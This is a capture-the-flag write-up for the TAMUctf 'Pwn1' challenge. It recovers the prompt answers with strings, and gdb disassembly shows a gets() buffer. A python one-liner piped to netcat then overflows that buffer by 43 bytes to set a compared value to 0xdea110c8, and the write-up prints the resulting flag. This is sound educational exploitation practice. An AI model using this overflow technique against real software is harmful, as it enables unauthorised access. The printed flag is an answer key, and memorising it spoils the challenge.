# Pwn1

## Points
384

## Description
nc pwn.tamuctf.com 4321

Difficulty: easy

[pwn1](https://tamuctf.com/files/b804e1ab7d43ff479292094d9ec64526/pwn1)

## Solution
Let's find out what strings are inside `strings pwn1`. Notice
```
Right. Off you go.
flag.txt
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
Sir Lancelot of Camelot
I don't know that! Auuuuuuuugh!
What... is your quest?
To seek the Holy Grail.
What... is my secret?
;*2$"
```
From that we can deduce the answers for the first two questions. But what about the secret?

Let's debug the program in `gdb` until it asks us to enter the third answer.
```
   0x565558a3 <main+298>:	sub    esp,0xc
   0x565558a6 <main+301>:	lea    eax,[ebp-0x3b]
   0x565558a9 <main+304>:	push   eax
=> 0x565558aa <main+305>:	call   0x56555520 <gets@plt>
   0x565558af <main+310>:	add    esp,0x10
   0x565558b2 <main+313>:	cmp    DWORD PTR [ebp-0x10],0xdea110c8
   0x565558b9 <main+320>:	jne    0x565558c2 <main+329>
   0x565558bb <main+322>:	call   0x565556fd <print_flag>
```
The address for storing our input is `ebp-0x3b`. The address which will be compared in `cmp` instruction is `ebp-0x10`. That corresponds to index `0x3b-0x10 = 43` in our input. The `DWORD = int32` value must be equal to `0xdea110c8`. In little-endian that's bytes `0xc8 0x10 0xa1 0xde`.
```sh
# python -c "print('Sir Lancelot of Camelot'); print('To seek the Holy Grail.'); print('a'*43 + '\xc8\x10\xa1\xde')" | nc pwn.tamuctf.com 4321
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
gigem{34sy_CC428ECD75A0D392}
```
Note that if I tried this with [netcat in Windows](https://eternallybored.org/misc/netcat/), it didn't work. The special characters were not passed correctly.

## Flag
`gigem{34sy_CC428ECD75A0D392}`